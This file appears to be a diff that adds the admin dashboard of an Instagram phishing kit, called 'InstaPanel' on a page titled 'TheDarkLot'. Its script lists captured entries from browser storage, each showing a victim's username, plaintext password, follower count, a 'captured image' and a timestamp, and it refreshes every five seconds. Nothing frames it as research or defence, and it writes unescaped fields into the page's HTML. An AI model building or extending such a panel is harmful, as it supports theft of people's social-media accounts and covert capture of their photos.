@@ -1,0 +1,65 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel | TheDarkLot</title>
+  <style>
+    body {
+      background: #0f0f0f;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      padding: 20px;
+    }
+    h1 {
+      color: #00ff95;
+    }
+    .entry {
+      background: #1a1a1a;
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 15px;
+      box-shadow: 0 0 10px rgba(0,255,149,0.3);
+    }
+    img {
+      max-width: 100px;
+      border-radius: 5px;
+    }
+    .meta {
+      font-size: 14px;
+      margin-top: 5px;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+  <h1>📋 InstaPanel Admin Dashboard</h1>
+  <div id="entries">Loading data...</div>
+
+  <script>
+    function loadData() {
+      const data = JSON.parse(localStorage.getItem("instaEntries") || "[]");
+      const container = document.getElementById('entries');
+      container.innerHTML = '';
+
+      data.reverse().forEach(entry => {
+        const div = document.createElement('div');
+        div.className = 'entry';
+        div.innerHTML = `
+          <strong>Username:</strong> @${entry.username}<br>
+          <strong>Password:</strong> ${entry.password}<br>
+          <strong>Followers:</strong> ${entry.followers}<br>
+          <div class="meta">📸 Captured Image:</div>
+          <img src="${entry.imageURL}" alt="Snap">
+          <div class="meta">🕒 ${entry.timestamp}</div>
+        `;
+        container.appendChild(div);
+      });
+    }
+
+    loadData();
+    setInterval(loadData, 5000); // auto-refresh every 5 seconds
+  </script>
+</body>
+</html>
